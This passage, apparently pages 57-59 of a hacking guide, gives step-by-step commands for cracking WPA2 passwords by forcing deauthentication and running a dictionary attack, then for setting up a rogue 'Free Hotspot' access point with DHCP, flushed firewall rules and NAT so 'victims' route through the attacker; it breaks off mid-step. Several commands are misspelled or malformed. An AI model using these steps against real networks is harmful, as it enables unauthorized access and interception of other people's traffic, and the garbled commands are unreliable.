  - '[PAGE 57]


    # Breaking Wireless WPA2


    ![](img/c6b688dca6570d17db3036b560ef0905_57_0.png)


    There are number different security encryption and protocol on wireless access
    point like WEP, WPA and WPA2. WEP and WPA are easy to crack and there are number
    of online resources about how to hack a WEP or WPA on wireless devices. WPA2 are
    more secure and if a strong password is used, they are very difficult to crack.
    However; there are also ways to crack WPA2 passwords.


    To crack a WPA2 password follow the below steps.


    +   * airmon-ng wlan0 -- It will start the logical mon0 interface

    * iwconfig -- To verify the configuration

    * airodump-ng mon0

    * airodump-ng -w OUTFILE -c 1 -bssid 58:6D:8F:A0:16:11 mon0 --w to write output
    to file

    * airplay-ng -0 0 -a 58:6D:8F:A0:16:11 mon0 -- Run while airodump-ng command is
    running to initiate a deauthentication so you can get the hash passwords on the
    file

    * aircrack-ng OUTFILE-01.cap -w /usr/share/passwords/wordlists/darkc0de.lst --
    Initiate a password attack to the wireless (Brute Force/Dictionary Attack)'
  - "[PAGE 58]\n\n# Rogue Access Point\n\n![](img/c6b688dca6570d17db3036b560ef0905_58_0.png)\n\
    \nOne of the common ways of wireless attacks is to set up a fake access points\
    \ and get others to authenticate on it. This can be done in Companies, airports,\
    \ coffee shops, etc.\n\nAs an example, imagine you are in an airport trying to\
    \ connect to a free WIFI and you see an Access Point called Free-Airport. This\
    \ could be the attacker and not actually the airport service.\n\n+   - To set\
    \ up a Rogue access point follow the below steps:\n- Install and configure a DHCP\
    \ server:\n  - apt-get install dhcp3-server -y\n  - mv /etc/dhcp3/dhcppd.conf\
    \ /etc/dhcp3/dhcppd.conf.backup\n  - nano /etc/dhcp3/dhcppd.conf\n    - ddns-update-style\
    \ ad-hoc;\n    - default-lease-time 600;\n    - max-lease-time 7200;\n    - subnet\
    \ 192.168.2.0 netmask 255.255.255.0 {\n    - option subnet-mask 255.255.255.0;"
  - "[PAGE 59]\n\n+   - option broadcast-address 192.168.2.55;\n- option routers 192.168.2.1;\
    \ - Our IP address\n- option domain-name-servers 8.8.8.8;\n- range 192.168.2.51\
    \ 192.168.2.100;\n\n+   - Set up your wireless device as an access point (in other\
    \ terminology a hot spot).\n\n+     - airmon-ng start wlan0\n  - airdump-ng --essid\
    \ mon0 -- just to look who else is out there starting advertising SSID\n  - airbase-ng\
    \ --essid \"Free Hotspot\"-c 6 mono -- This will convert your computer to an AP\
    \ with Free Hotspot SSID and give you a new interface name for AP\n\n+   - Set\
    \ up the IP addressing and services\n\n+     - ifconfig at0 192.168.2.1/24\n \
    \ - route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1\n  - dhcp3\
    \ -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0\n  - /etc/init.d/dhcp3-server\
    \ start\n\n+   - Disable firewalls and enable routing to give the victims internet\
    \ connectivity\n\n+     - iptables -flush\n  - iptables -table nat -flush\n  -\
    \ iptables -delete-chain\n  - iptables -table nat -append POSTROUTING -out-interface\
    \ eth0 -j MASQUERADE\n  - iptables -append FORWARD -in-interface at0 -j ACCEPT\n\
    \  - echo 1 > /proc/sys/net/ipv4/ip_forward\n\n+   - Once client connects you\
